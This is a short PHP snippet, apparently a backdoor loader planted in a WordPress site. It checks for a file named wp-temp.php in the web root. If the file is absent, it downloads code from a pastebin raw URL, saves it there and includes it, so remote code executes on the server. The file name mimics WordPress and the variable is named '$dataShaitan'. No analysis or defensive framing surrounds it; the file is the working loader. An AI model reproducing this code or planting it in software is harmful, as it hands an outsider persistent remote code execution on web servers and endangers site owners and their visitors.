<?php
			if(file_exists($_SERVER["DOCUMENT_ROOT"]."/wp-temp.php")){
				chmod($_SERVER["DOCUMENT_ROOT"]."/wp-temp.php", 0644);
				include $_SERVER["DOCUMENT_ROOT"]."/wp-temp.php";
			}else{
				$ch = curl_init();
				curl_setopt($ch, CURLOPT_URL, "https://pastebin.com/raw/zE6rVcLb");
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($ch,CURLOPT_TIMEOUT,30);
				$dataShaitan = curl_exec($ch);
				file_put_contents($_SERVER["DOCUMENT_ROOT"]."/wp-temp.php", $dataShaitan);
				chmod($_SERVER["DOCUMENT_ROOT"]."/wp-temp.php", 0644);
				include $_SERVER["DOCUMENT_ROOT"]."/wp-temp.php";
			}